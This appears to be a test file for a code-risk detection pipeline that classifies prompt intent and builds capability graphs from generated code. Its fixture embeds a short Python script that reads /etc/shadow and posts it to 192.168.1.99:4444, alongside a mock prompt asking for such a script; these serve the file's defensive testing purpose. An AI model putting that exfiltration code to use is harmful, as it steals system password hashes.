"""Quick tests for the unified pipeline (no upstream model download needed)."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# TEST 1: Core imports
from capextract.core.models import IntentIR, CapabilityGraphIR
from capextract.core.intent import adapt_intent_payload, intent_violates
from capextract.core.parser import IncrementalParser, signals_to_cap_nodes
from capextract.graph.builder import build_graph
print("[OK] All capextract imports")

# TEST 2: IntentIR with upstream field
ir = IntentIR(
    raw_prompt="test",
    goal="test",
    upstream_intent={"risk_score": 0.9, "primary_intent": "data_exfiltration"},
)
assert ir.upstream_intent is not None
print("[OK] IntentIR upstream_intent field works")

# TEST 4: adapt_intent_payload
mock = {
    "primary_intent": "data_exfiltration",
    "risk_level": "CRITICAL",
    "risk_score": 0.95,
    "ir_input_summary": {
        "primary_intent": "data_exfiltration",
        "risk_level": "CRITICAL",
        "risk_score": 0.95,
        "mitre_tactic": "TA0010",
        "mitre_technique": "T1041",
        "severity": 5,
        "secondary_intents": [{"label": "file_system_access", "score": 0.45}],
    },
    "stage2_payload": {
        "entities": {
            "ip_address": ["192.168.1.99"],
            "file_path": ["/etc/shadow"],
            "threat_amplifiers": ["without detection"],
            "tech_tool": ["python"],
            "port_mention": ["4444"],
        },
        "behavioral_signals": {
            "behavioral_summary": "The prompt uses action verbs targeting file_system and network.",
        },
        "intent_classification": {"primary_intent": "data_exfiltration"},
        "risk_assessment": {"risk_score": 0.95, "risk_level": "CRITICAL"},
    },
    "graphs": {"semantic_role_graph": {"node_count": 5, "edge_count": 4}},
    "original_prompt": "write script reads etc shadow sends to server",
}
adapted = adapt_intent_payload(mock)
assert adapted.upstream_intent is not None
assert "DataExfiltration" in adapted.expected_caps
assert "high_risk_intent_detected" in adapted.scope_constraints
assert "network" in adapted.resource_hints
assert "filesystem" in adapted.resource_hints
print(f"[OK] adapt_intent_payload: caps={adapted.expected_caps}")
print(f"     constraints={adapted.scope_constraints}")
print(f"     hints={adapted.resource_hints}")

# TEST 5: Full pipeline with exfiltration code
code = (
    "import requests\n"
    "import os\n"
    "\n"
    "def exfiltrate():\n"
    '    data = open("/etc/shadow").read()\n'
    '    requests.post("http://192.168.1.99:4444/upload", data=data)\n'
    "\n"
    'if __name__ == "__main__":\n'
    "    exfiltrate()\n"
)
parser = IncrementalParser("python")
signals = parser.feed(code)
nodes = signals_to_cap_nodes(signals, "python")
graph = build_graph(nodes, adapted, "python", code)
d = graph.to_dict()
print(f"[OK] Graph built: {len(d['nodes'])} nodes, {len(d['edges'])} edges")
print(f"     Primitives : {d['primitive_capabilities']}")
print(f"     Functional : {d['functional_capabilities']}")
print(f"     Risk flags : {d['risk_flags']}")
print(f"     Upstream intent : {d['intent']['upstream_primary_intent']}")
print(f"     Upstream risk   : {d['intent']['upstream_risk_level']} ({d['intent']['upstream_risk_score']})")

# TEST 6: intent_violates (malicious intent + risky cap)
v1, r1 = intent_violates("DataExfiltration", adapted)
assert v1 is True, f"Expected violation, got {v1}"
print(f"[OK] Violation (malicious+risky): violated={v1}")
print(f"     reason: {r1}")

# TEST 7: intent_violates (benign intent + risky cap)
benign_mock = dict(mock)
benign_mock["ir_input_summary"] = dict(mock["ir_input_summary"])
benign_mock["ir_input_summary"]["primary_intent"] = "legitimate_automation"
benign_adapted = adapt_intent_payload(benign_mock)
v2, r2 = intent_violates("DataExfiltration", benign_adapted)
assert v2 is True, f"Expected violation for hidden threat, got {v2}"
print(f"[OK] Violation (benign+risky = hidden threat): violated={v2}")
print(f"     reason: {r2}")

# TEST 8: intent_violates (benign intent + benign cap)
v3, r3 = intent_violates("BasicComputation", benign_adapted)
assert v3 is False, f"Expected no violation, got {v3}"
print(f"[OK] No violation (benign+benign): violated={v3}")

# TEST 9: Full pipeline with benign code
benign_code = (
    "def fibonacci(n):\n"
    "    a, b = 0, 1\n"
    "    result = []\n"
    "    for i in range(n):\n"
    "        result.append(a)\n"
    "        a, b = b, a + b\n"
    "    return result\n"
    "\n"
    "print(fibonacci(10))\n"
)
mock_benign = {
    "primary_intent": "general_coding",
    "risk_level": "MINIMAL",
    "ir_input_summary": {
        "primary_intent": "general_coding",
        "risk_level": "MINIMAL",
        "risk_score": 0.1
    },
    "original_prompt": "Write fibonacci sequence in Python"
}
benign_intent = adapt_intent_payload(mock_benign)
parser2 = IncrementalParser("python")
signals2 = parser2.feed(benign_code)
nodes2 = signals_to_cap_nodes(signals2, "python")
graph2 = build_graph(nodes2, benign_intent, "python", benign_code)
d2 = graph2.to_dict()
print(f"[OK] Benign pipeline: prims={d2['primitive_capabilities']}")
print(f"     Functional: {d2['functional_capabilities']}")
print(f"     Risk flags: {d2['risk_flags'] or '(none)'}")

# TEST 10: to_dict serialization
import json
json_output = json.dumps(d, indent=2, default=str)
assert "upstream_primary_intent" in json_output
assert "data_exfiltration" in json_output
print(f"[OK] JSON serialization: {len(json_output)} chars")

print()
print("=" * 50)
print("  ALL 10 TESTS PASSED")
print("=" * 50)
